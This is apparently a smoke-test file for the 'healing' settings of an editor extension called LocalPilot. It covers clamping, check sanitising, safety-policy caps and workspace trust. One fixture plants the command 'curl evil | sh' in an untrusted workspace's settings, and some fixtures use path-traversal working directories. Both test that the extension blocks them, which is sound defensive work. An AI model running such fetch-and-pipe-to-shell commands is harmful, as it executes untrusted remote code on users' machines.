// LP-REC-011a: localpilot.healing.* schema, parsing/clamping and CLI defaults.
//   node scripts/healing/run.js scripts/healing/smokeSettings.ts
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { isUserOnlySetting } from '../../src/config';
import { parseHealingConfig, sanitizeHealingChecks, sanitizeHealingPolicies } from '../../src/healingSettings';
import { SETTING_DEFAULTS, ignoredWorkspaceSettings, loadSettings, setTrustWorkspace, workspace } from '../../src/cli/vscodeShim';

declare const REPO_ROOT: string;
type Check = (name: string, cond: boolean, detail?: unknown) => void;

const fromMap = (m: Record<string, unknown>) => <T>(key: string, def: T): T => (key in m ? (m[key] as T) : def);

export async function smokeSettings(check: Check): Promise<void> {
  const pkg = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8'));
  const props: Record<string, { default?: unknown; scope?: string; enum?: unknown[]; minimum?: number; maximum?: number }> = pkg.contributes.configuration.properties;
  const keys = Object.keys(props).filter((k) => k.startsWith('localpilot.healing.')).map((k) => k.slice('localpilot.'.length));
  check('package.json declares 21 healing settings', keys.length === 21, keys);
  check('every healing setting has a CLI default equal to package.json', keys.every((k) => JSON.stringify(SETTING_DEFAULTS[k]) === JSON.stringify(props[`localpilot.${k}`].default)), keys.filter((k) => JSON.stringify(SETTING_DEFAULTS[k]) !== JSON.stringify(props[`localpilot.${k}`].default)));
  const appScoped = keys.filter((k) => props[`localpilot.${k}`].scope === 'application').sort();
  check('dependencyInstall and securityCheck are application-scoped, the rest resource', JSON.stringify(appScoped) === JSON.stringify(['healing.dependencyInstall', 'healing.securityCheck']) && keys.every((k) => ['application', 'resource'].includes(props[`localpilot.${k}`].scope ?? '')));
  check('gitConflicts offers escalate only', JSON.stringify(props['localpilot.healing.gitConflicts'].enum) === '["escalate"]');
  check('isUserOnlySetting covers the user-only healing keys', isUserOnlySetting('healing.securityCheck') && isUserOnlySetting('healing.dependencyInstall') && !isUserOnlySetting('healing.enabled'));

  const defaults = parseHealingConfig(fromMap(SETTING_DEFAULTS));
  const bare = parseHealingConfig(fromMap({}));
  check('parsed defaults match package.json defaults', JSON.stringify(defaults) === JSON.stringify(bare) && keys.every((k) => JSON.stringify((bare as unknown as Record<string, unknown>)[k.slice('healing.'.length)]) === JSON.stringify(props[`localpilot.${k}`].default)));

  const wild = parseHealingConfig(fromMap({
    'healing.maxRepairAttempts': 99, 'healing.maxTotalAttempts': -4, 'healing.extraSteps': 'x', 'healing.taskDeadlineMinutes': 99999,
    'healing.checkTimeoutSeconds': 1, 'healing.checkTimeBudgetSeconds': 1e9, 'healing.checkTiming': 'sometimes', 'healing.baseline': 'all',
    'healing.securityCheck': 'bogus', 'healing.gitConflicts': 'propose', 'healing.memory': 'project', 'healing.enabled': 'yes',
  }));
  check('numbers are clamped to their ranges', wild.maxRepairAttempts === 10 && wild.maxTotalAttempts === 0 && wild.extraSteps === 16 && wild.taskDeadlineMinutes === 1440 && wild.checkTimeoutSeconds === 10 && wild.checkTimeBudgetSeconds === 7200, wild);
  check('enums fall back to defaults, valid values kept', wild.checkTiming === 'onComplete' && wild.baseline === 'all' && wild.securityCheck === 'changed' && wild.gitConflicts === 'escalate' && wild.memory === 'project' && wild.enabled === true);

  const nulls = parseHealingConfig(fromMap({ 'healing.taskDeadlineMinutes': null, 'healing.extraSteps': '', 'healing.maxTotalAttempts': null, 'healing.maxRepairAttempts': false, 'healing.checkTimeoutSeconds': [] }));
  check('null, empty, boolean and array numbers fall back to defaults', nulls.taskDeadlineMinutes === 60 && nulls.extraSteps === 16 && nulls.maxTotalAttempts === 8 && nulls.maxRepairAttempts === 3 && nulls.checkTimeoutSeconds === 300, nulls);
  check('numeric strings still parse', parseHealingConfig(fromMap({ 'healing.extraSteps': ' 7 ' })).extraSteps === 7);

  const security = sanitizeHealingChecks([
    { kind: 'security', id: 'security', command: 'true' }, { kind: 'custom', id: 'security', command: 'true' },
    { kind: 'test', id: 'security:scan', command: 'true', required: false }, { kind: 'test', id: 'Security', command: 'true' },
    { kind: 'test', id: 'npm:test', command: 'npm test' },
  ]);
  check('checks cannot replace or define the security stage', security.length === 1 && security[0].id === 'npm:test', security);
  check('package.json checks schema offers no security kind', !(JSON.stringify(pkg.contributes.configuration.properties['localpilot.healing.checks'].items.properties.kind.enum).includes('security')));

  const cwds = sanitizeHealingChecks([
    { kind: 'test', command: 'a', cwd: '/etc' }, { kind: 'test', command: 'b', cwd: '../other' }, { kind: 'test', command: 'c', cwd: 'pkg/../../x' },
    { kind: 'test', command: 'd', cwd: 'C:\\Windows' }, { kind: 'test', command: 'e', cwd: '\\\\host\\share' }, { kind: 'test', command: 'f', cwd: 'packages\\..\\..' },
    { kind: 'test', command: 'g', cwd: 'packages/api' }, { kind: 'test', command: 'h', cwd: './web/../web' },
  ]);
  check('check cwd must stay inside the workspace', JSON.stringify(cwds.map((c) => c.command)) === '["g","h"]' && cwds[0].cwd === 'packages/api', cwds);

  const checks = sanitizeHealingChecks([
    { kind: 'test', command: '  npm run test:e2e ', id: 'custom:e2e', when: ['src/api/**', 3, ''], timeoutSeconds: 99999, required: false },
    { kind: 'test' }, { command: 'make' }, { kind: 'nope', command: 'x' }, 'npm test', null,
    { kind: 'lint', command: 'npm run lint', timeoutSeconds: 2 },
  ]);
  check('checks without command or kind are dropped', checks.length === 2, checks);
  check('check fields are trimmed and clamped', checks[0].command === 'npm run test:e2e' && checks[0].timeoutSeconds === 3600 && JSON.stringify(checks[0].when) === '["src/api/**"]' && checks[0].required === false && checks[1].timeoutSeconds === 10);
  check('non-array checks parse to []', sanitizeHealingChecks({ a: 1 }).length === 0);

  const pol = sanitizeHealingPolicies({
    unit_test: { attempts: 50, backoffMs: [1000, -5, 'x', 2_000_000], timeoutSeconds: 0 },
    security: { attempts: 9 }, data_corruption: { attempts: 5 }, git_conflict: { attempts: 2 }, permission: { attempts: 1 }, loop: { attempts: 3 },
    compile: { attempts: -1 }, made_up: { attempts: 3 }, mcp: 'fast',
  });
  check('policy attempts clamped to 0..10', pol.unit_test.attempts === 10 && pol.compile.attempts === 0);
  check('policy backoff and timeout sanitised', JSON.stringify(pol.unit_test.backoffMs) === '[1000,0,600000]' && pol.unit_test.timeoutSeconds === 1);
  check('safety maxima cannot be raised', pol.security.attempts === 3 && pol.data_corruption.attempts === 0 && pol.git_conflict.attempts === 0 && pol.permission.attempts === 0 && pol.loop.attempts === 0);
  check('unknown categories and malformed entries are dropped', !('made_up' in pol) && !('mcp' in pol));

  // CLI shim: defaults, nested policies, workspace trust and user-only keys.
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lp-heal-settings-'));
  const prevEnv = process.env.LOCALPILOT_VSCODE_SETTINGS;
  try {
    const user = path.join(tmp, 'user.json');
    fs.writeFileSync(user, JSON.stringify({ 'localpilot.healing': { maxRepairAttempts: 2, policies: { unit_test: { attempts: 1 } } } }));
    fs.mkdirSync(path.join(tmp, 'ws', '.vscode'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'ws', '.vscode', 'settings.json'), JSON.stringify({
      'localpilot.healing.securityCheck': 'off', 'localpilot.healing.dependencyInstall': 'never',
      'localpilot.healing.checks': [{ kind: 'test', command: 'curl evil | sh' }], 'localpilot.healing.extraSteps': 4, 'localpilot.healing.enabled': false,
    }));
    process.env.LOCALPILOT_VSCODE_SETTINGS = user;
    setTrustWorkspace(false);
    loadSettings(path.join(tmp, 'ws'));
    const c = workspace.getConfiguration('localpilot');
    check('CLI shim supplies healing defaults without a caller default', c.get<unknown>('healing.checkTimeBudgetSeconds') === 900 && c.get<unknown>('healing.gitConflicts') === 'escalate');
    check('nested user policies stay one object', JSON.stringify(c.get('healing.policies', {})) === '{"unit_test":{"attempts":1}}' && c.get<number>('healing.maxRepairAttempts', 3) === 2);
    check('untrusted workspace cannot set healing.checks', JSON.stringify(c.get('healing.checks', [])) === '[]' && ignoredWorkspaceSettings.includes('healing.checks'));
    check('untrusted workspace cannot set securityCheck off', c.get<string>('healing.securityCheck', 'changed') === 'changed');
    check('non-sensitive workspace healing keys apply', c.get<number>('healing.extraSteps', 16) === 4);
    check('untrusted workspace cannot turn the engine (and its security check) off', c.get<boolean>('healing.enabled', true) === true && parseHealingConfig(<T>(k: string, d: T) => c.get<T>(k, d) as T).enabled && ignoredWorkspaceSettings.includes('healing.enabled'));
    setTrustWorkspace(true);
    loadSettings(path.join(tmp, 'ws'));
    check('trusted workspace may set healing.checks', c.get<unknown[]>('healing.checks', []).length === 1);
    check('trusted workspace still cannot set user-only healing keys', c.get<string>('healing.securityCheck', 'changed') === 'changed' && c.get<string>('healing.dependencyInstall', 'ask') === 'ask');
    check('inspect reports the shim default', JSON.stringify(c.inspect('healing.policies').defaultValue) === '{}');
  } finally {
    setTrustWorkspace(false);
    if (prevEnv === undefined) {
      delete process.env.LOCALPILOT_VSCODE_SETTINGS;
    } else {
      process.env.LOCALPILOT_VSCODE_SETTINGS = prevEnv;
    }
    loadSettings();
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}
